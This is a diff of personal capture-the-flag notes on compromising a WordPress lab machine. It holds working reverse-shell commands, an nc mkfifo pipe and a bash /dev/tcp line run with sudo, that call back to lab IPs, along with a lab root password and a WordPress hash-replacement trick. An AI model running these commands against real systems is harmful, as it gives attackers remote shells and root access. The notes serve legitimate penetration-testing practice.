@@ -80,8 +80,12 @@
 * Also found multiple vulnerabilities with the xmlrpc.php page but they're kind of irrelevant bacause it's either a DDoS attack or a Brute Force and I want to keep brute forcing as my last resort.
 * Also, tried with the ftp but even if I was able to transfer files through it I don't think I can access files I transfered through the webpage.
 
-* Found this username and password in the "Cute File Browser" that I got access to through the directory `plugins`
+* Found this username and password in the "Cute File Browser" that I got access to through the directory `plugins`  
 root   8YsqfCTnvxAUeduzjNSXe22
+
+
+/etc/php/7.0/mods-available/ftp.ini
+/usr/share/php7.0-common/common/ftp.ini
 
 
 * Hash cracker  
@@ -90,8 +94,11 @@ root   8YsqfCTnvxAUeduzjNSXe22
 * So instead of trying to crack the hash an idea occured to me to change the whole hash into one that I know what it is and I found <a href="https://www.useotools.com/wordpress-password-hash-generator">this</a> which generates wordpress hashes that are hashed with Portable PHP password hashing framework and with that I got into the WordPress.
 
 
- exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 1234 >/tmp/f");
+ exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.46  1234 >/tmp/f");
 
+sudo rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|  nc 10.10.14.81  1234 >/tmp/f
+
+sudo bash -i >& /dev/tcp/10.10.14.81/4242 0>&1
 
  /etc/init.d/pro restart
 
@@ -157,10 +164,12 @@ define('DB_USER', 'wordpress');
   8. Next I needed to priv esc, although I used a kernel exploit that got me root in seconds (after I tried one that crashed the system) that was not the intended way.
   9. The intended way was waay easier. I had notch's password all along I don't know why I didn't try it which was the intended way.
   10. Once you get notch he has the ability to sudo and we found that out when we view notch's home and found the file .sudo_to_admin or sth like that.
-  11. Get a sudo reverse shell? I think this should get me root.
+  11. Get a sudo reverse shell. I did that with this command `sudo bash -i >& /dev/tcp/10.10.14.81/4242 0>&1` which of course got me to root.
 
 
 ## Where I Got Stuck?   
+
+* I HAD THE PASSWORD ALL ALONG!!
 * That I didn't try to use the password that I have to `su` as notch.
 * I had the password all along. I kept seeing it in the linpeas scan with another password but didn't even once think to try it.
 * So yeah I need to permute the passwords and usernames I find.
@@ -186,11 +195,7 @@ define('DB_USER', 'wordpress');
 
 * KeepItSimpleStupid.   
 
+## Writeup  
 
-nc -z -v localhost 20-80 2>&1 | grep succeeded
-
-
-
-
-
-
+### ippsec   
+* wpscan (Check it out)
